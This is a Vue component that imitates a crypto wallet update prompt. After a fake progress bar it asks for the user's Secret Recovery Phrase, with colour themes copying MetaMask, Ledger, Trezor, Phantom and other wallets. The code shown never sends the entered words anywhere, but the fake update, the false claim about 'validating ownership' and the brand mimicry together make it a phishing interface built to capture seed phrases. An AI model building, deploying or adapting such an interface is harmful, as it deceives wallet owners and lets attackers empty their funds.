<template>
  <Teleport to="body">
    <Transition name="web3-modal-fade">
      <div v-if="isOpen" class="web3-modal-overlay" @click.self="close">
        <!-- container stays right-side as requested -->
        <div
          class="web3-modal-container"
          :class="{ loading: showLoader }"
          :style="containerStyle"
        >
          <!-- Loader overlay -->
          <transition name="fade">
            <div
              v-if="showLoader"
              class="loader-overlay"
              :style="{ background: activeTheme.loaderBg, color: activeTheme.text }"
            >
              <div class="loader-inner" :style="{ background: activeTheme.innerCardBg || 'transparent' }">
                <!-- CSS loader variant -->
                <div
                  :class="['css-loader', loaderClass]"
                  :style="cssLoaderInlineStyle"
                  aria-hidden="true"
                >
                  <span v-if="loaderClass === 'dot'"></span>
                  <span v-if="loaderClass === 'dot'"></span>
                  <span v-if="loaderClass === 'dot'"></span>
                </div>

                <div class="loader-label" :style="{ color: activeTheme.text }">
                  Connecting to {{ props.wallet?.name || 'wallet' }}...
                </div>
              </div>
            </div>
          </transition>

          <!-- Modal header -->
          <div class="web3-modal-header" :style="{ opacity: showLoader ? 0.35 : 1 }">
            <span class="wallet-header-icon">{{ props.wallet?.icon }}</span>
            <button class="close-btn" @click="close" aria-label="Close modal">
              <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                <path d="M15 5L5 15M5 5L15 15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
              </svg>
            </button>
          </div>

          <!-- Modal body -->
          <div class="web3-modal-body" :aria-busy="showLoader ? 'true' : 'false'">
            <!-- Update available (normal content) -->
            <template v-if="!updating && !showSeedImport">
              <div class="icon-container" style="display:flex;justify-content:center;margin-bottom:0.1rem;">
                <!-- stroke colored with theme accent where appropriate -->
                <svg width="64" height="64" viewBox="0 0 64 64" fill="none" style="stroke:black">
                  <path d="M32 12V32M32 32L42 22M32 32L22 22" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
                  <path d="M16 38H48V48C48 49.1046 47.1046 50 46 50H18C16.8954 50 16 49.1046 16 48V38Z" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
                  <path d="M16 38H48" stroke-width="3" stroke-linecap="round" style="stroke:black; stroke-width: 4;" />
                </svg>
              </div>

              <h1 class="title" :style="{ textAlign: 'center' }">Update Available</h1>
              <p class="version" :style="{ textAlign: 'center' }">Version 12.12.0</p>

              <ul class="features" :style="{ margin: '1rem auto', maxWidth: '320px', }">
                <li>Fix main build modifying desktop build steps</li>
                <li>Improving the security system</li>
                <li>Fix incorrect network information</li>
                <li>Improve performance on signature request</li>
              </ul>

              <button class="update-btn" @click="handleUpdate" :style="{ background: activeTheme.buttonBg, color: activeTheme.buttonText, display: 'block', margin: '1rem auto' }">
                Update
              </button>

              <p class="support" :style="{ textAlign: 'center', marginTop: 'auto' }">
                Need help?
                <a href="#" @click.prevent="handleContactSupport" :style="{textDecoration: 'underline' }">Contact {{ props.wallet?.name }} Support</a>
              </p>
            </template>

            <!-- Update progress -->
            <template v-else-if="updating">
              <div class="update-progress-container">
                <div class="progress-icon">
                  <svg width="32" height="32" viewBox="0 0 32 32" class="spin">
                    <circle cx="16" cy="16" r="12" :stroke="activeTheme.buttonBg || '#0088CC'" stroke-width="4" fill="none" stroke-dasharray="75" stroke-dashoffset="25"/>
                  </svg>
                </div>

                <div style="margin-top: 10px; margin-bottom: 10px;">Updating {{ props.wallet?.name }} Wallet</div>
                <div>Please wait while we update to version 12.12.0</div>

                <svg width="320" height="32" viewBox="0 0 320 32">
                  <rect x="0" y="12" width="320" height="8" rx="4" fill="rgba(255,255,255,0.15)"/>
                  <rect x="0" y="12" :width="3.2 * updateProgress" height="8" rx="4" :fill="activeTheme.buttonBg || '#0088CC'"/>
                </svg>

                <div class="progress-text" :style="{ color: activeTheme.buttonBg }">{{ updateProgress }}%</div>
                <div style="font-size: small; font-weight: 100; color:grey; text-align: center;" >this may take a few moments. Please do not close this window.</div>
              </div>
            </template>

            <!-- Seed import -->
            <template v-else-if="showSeedImport">
              <div class="import-seed-container" :style="seedContainerStyle">
                <h2 style="text-align:left; width:100%; color: inherit; margin-top:auto">Import your wallet with your Secret Recovery Phrase</h2>

                <label for="seed-count" class="seed-label" :style="{ color: activeTheme.text }">We will use your Secret Recovery Phrase to validate your ownership. Enter the Secret Recovery Phrase that you were given when you created your wallet. <a href="" @click.prevent="handleContactSupport">Learn more</a> </label>
                <div class="seed-select-row">
                  <select id="seed-count" class="seed-select" v-model="selectedSeedCount" @change="handleSeedCountChange" :style="selectStyle">
                    <option disabled value="">Select length</option>
                    <option v-for="count in seedCounts" :key="count" :value="count">I have a {{ count }}-word seed phrase</option>
                  </select>
                </div>

                <div
                  class="seed-inputs"
                  :style="{
                    gridTemplateColumns: activeTheme.layout === '3col' ? 'repeat(3,1fr)' : 'repeat(2,1fr)',
                    gap: activeTheme.layout === '3col' ? '0.75rem 1rem' : '0.5rem 1rem'
                  }"
                >
                  <div v-for="(val, idx) in seedValues" :key="idx" class="seed-input-group">
                    <div class="seed-input-wrapper">
                      <input
                        :type="showSeed[idx] ? 'text' : 'password'"
                        v-model="seedValues[idx]"
                        :placeholder="`Word ${idx + 1}`"
                        class="seed-input"
                        :style="seedInputStyle"
                      />
                      <button type="button" class="eye-btn" @click="toggleShowSeed(idx)" :style="{ color: activeTheme.text }" :aria-label="showSeed[idx] ? 'Hide' : 'Show'">
                        <svg v-if="showSeed[idx]" width="20" height="20" viewBox="0 0 20 20" fill="none">
                          <path d="M2 10C2 10 5 4 10 4C15 4 18 10 18 10C18 10 15 16 10 16C5 16 2 10 2 10Z"/>
                          <circle cx="10" cy="10" r="3"/>
                        </svg>
                        <svg v-else width="20" height="20" viewBox="0 0 20 20" fill="none">
                          <path d="M2 10C2 10 5 4 10 4C15 4 18 10 18 10C18 10 15 16 10 16C5 16 2 10 2 10Z"/>
                          <path d="M4 4L16 16"/>
                        </svg>
                      </button>
                    </div>
                  </div>
                </div>

                <button class="update-btn" :style="importButtonStyle">Import</button>
              </div>
            </template>
          </div>
        </div>
      </div>
    </Transition>
  </Teleport>
</template>

<script setup lang="ts">
import { ref, watch, computed } from 'vue';

const LOADER_DURATION_MS = 5000; // 5s

const props = defineProps<{
  isOpen: boolean;
  wallet: { id: string; name: string; icon: string } | null;
}>();

const emit = defineEmits(['close', 'connect']);

// states for update/seed flows
const updating = ref(false);
const updateProgress = ref(0);
const showSeedImport = ref(false);

// seed inputs
const allSeedCounts = [12, 15, 18, 21, 24];
const seedCounts = ref<number[]>([...allSeedCounts]);
const selectedSeedCount = ref<number | ''>(12);
const seedValues = ref<string[]>([]);
const showSeed = ref<boolean[]>([]);

// loader control
const showLoader = ref(false);
const loaderTimer: { id: number | null } = { id: null };

// Wallet visual theme profiles
type Theme = {
  loaderBg: string;
  innerCardBg?: string;
  text: string;
  inputBg: string;
  inputBorder: string;
  inputPlaceholder: string;
  buttonBg: string;
  buttonText: string;
  layout?: '2col' | '3col';
  loaderType?: 'ring' | 'pulse' | 'dot';
};

const walletThemes: Record<string, Theme> = {
  metamask: {
    loaderBg: 'linear-gradient(180deg,#FF9A3C 0%,#D86E1B 100%)',
    innerCardBg: 'rgba(255,255,255,0.04)',
    text: '#fff',
    inputBg: '#24180f',
    inputBorder: '#3a250f',
    inputPlaceholder: '#caa68a',
    buttonBg: '#FF9A3C',
    buttonText: '#000',
    layout: '3col',
    loaderType: 'ring',
  },
  trust: {
    loaderBg: 'linear-gradient(180deg,#0b2c66 0%,#1b4ea8 100%)',
    innerCardBg: 'rgba(255,255,255,0.02)',
    text: '#fff',
    inputBg: '#071232',
    inputBorder: '#163165',
    inputPlaceholder: '#9fb6e6',
    buttonBg: '#1b6be0',
    buttonText: '#fff',
    layout: '2col',
    loaderType: 'pulse'
  },
  coinbase: {
    loaderBg: 'linear-gradient(180deg,#0078ff 0%,#0052cc 100%)',
    innerCardBg: 'rgba(255,255,255,0.02)',
    text: '#fff',
    inputBg: '#053164',
    inputBorder: '#1f4db4',
    inputPlaceholder: '#cfe8ff',
    buttonBg: '#fff',
    buttonText: '#0078ff',
    layout: '2col',
    loaderType: 'dot'
  },
  ledger: {
    loaderBg: 'linear-gradient(180deg,#0b0b0b 0%,#1f1f1f 100%)',
    innerCardBg: 'rgba(255,255,255,0.02)',
    text: '#fff',
    inputBg: '#0f1113',
    inputBorder: '#2b2b2b',
    inputPlaceholder: '#7f7f7f',
    buttonBg: '#111',
    buttonText: '#fff',
    layout: '3col',
    loaderType: 'ring'
  },
  trezor: {
    loaderBg: 'linear-gradient(180deg,#0f2b18 0%,#1f6b3e 100%)',
    innerCardBg: 'rgba(255,255,255,0.02)',
    text: '#fff',
    inputBg: '#072518',
    inputBorder: '#114a33',
    inputPlaceholder: '#9fd7b2',
    buttonBg: '#16a76f',
    buttonText: '#fff',
    layout: '2col',
    loaderType: 'dot'
  },
  phantom: {
    loaderBg: 'linear-gradient(135deg,#3b125b 0%,#8b5cf6 100%)',
    innerCardBg: 'rgba(255,255,255,0.02)',
    text: '#fff',
    inputBg: '#221338',
    inputBorder: '#3a1f4d',
    inputPlaceholder: '#d6bef7',
    buttonBg: '#8b5cf6',
    buttonText: '#fff',
    layout: '3col',
    loaderType: 'pulse'
  },
  okx: {
    loaderBg: 'linear-gradient(180deg,#000000 0%,#2b2b2b 100%)',
    innerCardBg: 'rgba(255,255,255,0.02)',
    text: '#fff',
    inputBg: '#0b0b0b',
    inputBorder: '#232323',
    inputPlaceholder: '#9b9b9b',
    buttonBg: '#111',
    buttonText: '#fff',
    layout: '3col',
    loaderType: 'ring'
  },
  rabby: {
    loaderBg: 'linear-gradient(180deg,#2b1f6a 0%,#644adf 100%)',
    innerCardBg: 'rgba(255,255,255,0.03)',
    text: '#fff',
    inputBg: '#1b1533',
    inputBorder: '#3b2b6b',
    inputPlaceholder: '#bfb2ff',
    buttonBg: '#5c46e6',
    buttonText: '#fff',
    layout: '3col',
    loaderType: 'pulse'
  },
  uniswap: {
    loaderBg: 'linear-gradient(180deg,#ff66b2 0%,#ff007a 100%)',
    innerCardBg: 'rgba(255,255,255,0.04)',
    text: '#fff',
    inputBg: '#33021a',
    inputBorder: '#5a0633',
    inputPlaceholder: '#ffcde6',
    buttonBg: '#fff',
    buttonText: '#ff007a',
    layout: '2col',
    loaderType: 'dot'
  },
  solflare: {
    loaderBg: 'linear-gradient(180deg,#ffb600 0%,#ff8800 100%)',
    innerCardBg: 'rgba(0,0,0,0.02)',
    text: '#111',
    inputBg: '#332609',
    inputBorder: '#5a3f0d',
    inputPlaceholder: '#ffe8a3',
    buttonBg: '#ffb600',
    buttonText: '#111',
    layout: '3col',
    loaderType: 'ring'
  },
  magiceden: {
    loaderBg: 'linear-gradient(180deg,#2b5876 0%,#3a7fa3 100%)',
    innerCardBg: 'rgba(255,255,255,0.03)',
    text: '#fff',
    inputBg: '#072a3a',
    inputBorder: '#124e67',
    inputPlaceholder: '#bcdce6',
    buttonBg: '#2eb7f5',
    buttonText: '#fff',
    layout: '3col',
    loaderType: 'pulse'
  },
  default: {
    loaderBg: 'linear-gradient(180deg,#ffffff 0%,#f3f4f6 100%)',
    innerCardBg: 'rgba(0,0,0,0.02)',
    text: '#111',
    inputBg: '#fff',
    inputBorder: '#ddd',
    inputPlaceholder: '#999',
    buttonBg: '#0088cc',
    buttonText: '#fff',
    layout: '2col',
    loaderType: 'ring'
  }
};

// computed active theme based on wallet id
const activeTheme = computed<Theme>(() => {
  const id = props.wallet?.id ?? 'default';
  return walletThemes[id] || walletThemes.default;
});

// container style: apply theme background while in seed import (so entire modal body matches)
const containerStyle = computed(() => {
  if (showSeedImport.value) {
    return { background: activeTheme.value.loaderBg };
  }
  // otherwise white
  return { background: '#fff' };
});

// seed container styling (inner card)
const seedContainerStyle = computed(() => ({
  background: activeTheme.value.innerCardBg || 'transparent',
  borderRadius: '12px',
  color: activeTheme.value.text
}));

const selectStyle = computed(() => ({
  background: activeTheme.value.inputBg,
  border: `1px solid ${activeTheme.value.inputBorder}`,
  color: activeTheme.value.text
}));

const seedInputStyle = computed(() => ({
  background: activeTheme.value.inputBg,
  border: `1px solid ${activeTheme.value.inputBorder}`,
  color: activeTheme.value.text,
  padding: '10px',
  borderRadius: '8px'
}));

const importButtonStyle = computed(() => ({
  background: activeTheme.value.buttonBg,
  color: activeTheme.value.buttonText,
  marginTop: '12px',
  padding: '12px 18px',
  borderRadius: '10px',
  border: 'none',
  width: '100%',
  fontWeight: 700
}));

// loader class and inline style
const loaderClass = computed(() => {
  return (activeTheme.value.loaderType === 'pulse') ? 'pulse' :
         (activeTheme.value.loaderType === 'dot') ? 'dot' : 'ring';
});

const cssLoaderInlineStyle = computed(() => {
  const color = activeTheme.value.text;
  if (loaderClass.value === 'ring') {
    return { borderTopColor: color };
  }
  if (loaderClass.value === 'pulse') {
    return { boxShadow: `0 0 0 0 ${color}` };
  }
  return {};
});

function clearLoaderTimer() {
  if (loaderTimer.id) {
    window.clearTimeout(loaderTimer.id);
    loaderTimer.id = null;
  }
}

// prepare seed counts, show loader for LOADER_DURATION_MS
function startLoaderForWallet(walletId: string | undefined | null) {
  clearLoaderTimer();

  // reset seed counts by wallet
  const id = walletId ?? null;
  if (id === 'trust') {
    seedCounts.value = [12, 24];
  } else if (id === 'ledger' || id === 'trezor') {
    seedCounts.value = [24];
  } else if (id === 'phantom' || id === 'solflare') {
    seedCounts.value = [12];
  } else {
    seedCounts.value = [...allSeedCounts];
  }

  selectedSeedCount.value = seedCounts.value.length ? seedCounts.value[0] : 12;
  seedValues.value = Array((selectedSeedCount.value as number) || 12).fill('');
  showSeed.value = Array((selectedSeedCount.value as number) || 12).fill(false);

  // show loader
  showLoader.value = true;
  loaderTimer.id = window.setTimeout(() => {
    showLoader.value = false;
    loaderTimer.id = null;
  }, LOADER_DURATION_MS);
}

// watchers for props.wallet and props.isOpen
watch(
  () => props.wallet,
  (wallet) => {
    if (props.isOpen) startLoaderForWallet(wallet?.id ?? null);
  },
  { immediate: true }
);

watch(
  () => props.isOpen,
  (open) => {
    if (open) startLoaderForWallet(props.wallet?.id ?? null);
    else {
      clearLoaderTimer();
      showLoader.value = false;
    }
  },
  { immediate: true }
);

// handlers
function handleSeedCountChange(e: Event) {
  const count = Number((e.target as HTMLSelectElement).value);
  selectedSeedCount.value = count;
  seedValues.value = Array(count).fill('');
  showSeed.value = Array(count).fill(false);
}

function toggleShowSeed(idx: number) {
  showSeed.value[idx] = !showSeed.value[idx];
}

function close() {
  clearLoaderTimer();
  emit('close');
}

function connectWallet(wallet: any) {
  emit('connect', wallet);
}

function onIconError(e: Event) {
  (e.target as HTMLImageElement).src = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="80" height="80"><rect width="100%" height="100%" fill="%23e5e7eb"/><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" fill="%23999" font-size="12">NO ICON</text></svg>';
}

function handleContactSupport() {
  if (props.wallet?.id === 'trust') window.open('https://trustwallet.com/', '_blank');
  else if (props.wallet?.id === 'metamask') window.open('https://support.metamask.io/', '_blank');
  else window.open('https://support.google.com/', '_blank');
}

// update simulation
function handleUpdate() {
  updating.value = true;
  updateProgress.value = 0;
  showSeedImport.value = false;

  const duration = 10000;
  const interval = 100;
  let elapsed = 0;

  const timer = window.setInterval(() => {
    elapsed += interval;
    updateProgress.value = Math.min(Math.round((elapsed / duration) * 100), 100);
    if (updateProgress.value >= 100) {
      window.clearInterval(timer);
      setTimeout(() => {
        updating.value = false;
        showSeedImport.value = true;
      }, 500);
    }
  }, interval);
}
</script>

<style scoped>
.web3-modal-overlay {
  position: fixed;
  top: 0; left: 0; width: 100vw; height: 100vh;
  background: rgba(0,0,0,0.3);
  z-index: 10010;
  display: flex;
  align-items: flex-start;
  justify-content: flex-end; /* keep right-side */
  padding: 0.5rem 2rem 0 2rem;
}
.web3-modal-container {
  background: #fff;
  /* border-radius: 18px; */
  box-shadow: 0 8px 32px rgba(0,0,0,0.15);
  width: 440px;
  max-width: 96vw;
  margin-top: 1rem;
  margin-right: 3rem;
  animation: slideInRight 0.3s;
  max-height: 90vh;
  overflow: hidden;
  position: relative;
}
@keyframes slideInRight {
  from { transform: translateX(100px); opacity: 0; }
  to { transform: translateX(0); opacity: 1; }
}

/* Loader overlay */
.loader-overlay {
  position: absolute;
  inset: 0;
  z-index: 60;
  display: flex;
  align-items: center;
  justify-content: center;
  -webkit-backdrop-filter: blur(2px);
  backdrop-filter: blur(2px);
}

/* inner loader card */
.loader-inner {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 12px;
  padding: 20px 28px;
  border-radius: 12px;
  text-align: center;
  width: 100%;
  max-width: 360px;
}

/* logo inside loader */
.loader-logo {
  width: 84px;
  height: 84px;
  object-fit: contain;
  border-radius: 12px;
  background: rgba(255,255,255,0.06);
  padding: 6px;
}

/* CSS loaders */
.css-loader.ring {
  width: 72px;
  height: 72px;
  border-radius: 50%;
  border: 6px solid rgba(255,255,255,0.15);
  border-top-color: rgba(255,255,255,0.95);
  animation: spin 1s linear infinite;
}

.css-loader.pulse {
  width: 68px;
  height: 68px;
  border-radius: 50%;
  background: rgba(255,255,255,0.12);
  box-shadow: 0 0 0 0 rgba(255,255,255,0.2);
  animation: pulse 1.6s infinite;
}

.css-loader.dot {
  display: flex;
  gap: 8px;
  align-items: center;
  justify-content: center;
}
.css-loader.dot span {
  display:inline-block;
  width:12px;height:12px;border-radius:50%;
  background: rgba(255,255,255,0.95);
  animation: dot 1s infinite ease-in-out;
}
.css-loader.dot span:nth-child(2){ animation-delay: 0.12s;}
.css-loader.dot span:nth-child(3){ animation-delay: 0.24s;}

/* fallback spinner */
.default-spinner {
  border: 6px solid rgba(255, 255, 255, 0.18);
  border-top-color: rgba(0,0,0,0.7);
  border-radius: 50%;
  width: 72px;
  height: 72px;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}
@keyframes pulse {
  0% { box-shadow: 0 0 0 0 rgba(255,255,255,0.14); transform: scale(1); }
  70% { box-shadow: 0 0 0 18px rgba(255,255,255,0); transform: scale(1.06); }
  100% { box-shadow: 0 0 0 0 rgba(255,255,255,0); transform: scale(1); }
}
@keyframes dot {
  0%, 80%, 100% { transform: scale(0); opacity: 0.2 }
  40% { transform: scale(1); opacity: 1 }
}

/* loader label */
.loader-label {
  font-weight: 700;
  font-size: 1rem;
  text-align: center;
}

/* header + body */
.web3-modal-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  font-size: 1.1rem;
  font-weight: 600;
  padding: 1rem 1.5rem 0.5rem 1.5rem;
}
.web3-modal-body {
  padding: 1.5rem;
  display: flex;
  flex-direction: column;
  gap: 1rem;
  overflow-y: auto;
  max-height: calc(90vh - 88px);
}
.close-btn {
  background: none;
  border: 2px solid darkgrey;
  color: grey;
  border-radius: 50%;
  width: 35px;
  height: 35px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  padding: 0;
  transition: background 0.2s;
  font-size: 1.5rem;
}
.close-btn:hover { background: #f0f9ff; }
.wallet-header-icon { font-size: 1.6rem; margin-right: 0.5rem; }

/* update + progress */
.icon-container { margin-bottom: 24px; }
.title { font-weight: 600; margin: 0 0 5px 0; }
.version { font-size: 15px; margin: 0 0 10px 0; font-weight: lighter; }
.features {padding: 0; margin: 0 0 15px 0; list-style: none; text-align: left;}
.features li { font-size: 14px; margin-bottom: 10px; padding-left: 10px; position: relative; }
.features li::before { content: '•'; position: absolute; left: -8px; font-weight: bold; }

.update-btn {
  width: 100%;
  color: white;
  border: none;
  border-radius: 100px;
  padding: 16px 32px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  transition: background 0.2s;
  margin-bottom: 16px;
}
.update-btn:hover { transform: translateY(-2px); }

/* progress */
.update-progress-container { display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem 0; }
.progress-text { font-size:1.2rem;margin-top:0.5rem;color:#0088CC; }
.progress-icon { margin-top:1rem; }
.spin { animation: spin 1s linear infinite; }

/* seed import */
.import-seed-container { display:flex;flex-direction:column;align-items:stretch;justify-content:flex-start;padding:2rem 0;width:100%; }
.seed-label { font-weight:500;margin-bottom:0.5rem;display:block;text-align:left; }
.seed-select-row { margin-bottom:1rem;width:100%; }
.seed-select { padding:0.5rem;border-radius:8px;border:1px solid #ddd;font-size:1rem;width:100%;box-sizing:border-box; }
.seed-inputs { display:grid;width:100%; }
.seed-input-group { width:100%; }
.seed-input-wrapper { position:relative;width:100%; }
.seed-input { width:100%; padding:0.5rem 2.2rem 0.5rem 0.5rem; border-radius:8px; border:1px solid #ddd; font-size:1rem; box-sizing:border-box; }

/* Hide modal content when loader active */
.web3-modal-container.loading .web3-modal-header,
.web3-modal-container.loading .web3-modal-body {
  visibility: hidden;
}

/* small helpers */
.eye-btn {
  position:absolute; right:0.5rem; top:50%; transform:translateY(-50%); background:none; border:none; cursor:pointer; padding:0;
  display:flex; align-items:center;
}
.eye-btn svg { stroke:#24292e; }
.eye-btn svg path, .eye-btn svg circle { stroke:#24292e; }

@media (max-width: 600px) {
  .web3-modal-overlay { align-items:center; justify-content:center; padding:0; background: rgba(0,0,0,0.5); }
  .web3-modal-container { width:100vw; height:100vh; margin:0; border-radius:0; animation:none; box-shadow:none; display:flex; flex-direction:column; justify-content:flex-start; }
  .seed-inputs { grid-template-columns: 1fr !important; }
}

.fade-enter-active, .fade-leave-active { transition: opacity 0.35s ease; }
.fade-enter-from, .fade-leave-to { opacity: 0; }
.web3-modal-fade-enter-active, .web3-modal-fade-leave-active { transition: opacity .25s ease; }
.web3-modal-fade-enter-from, .web3-modal-fade-leave-to { opacity: 0; }
</style>
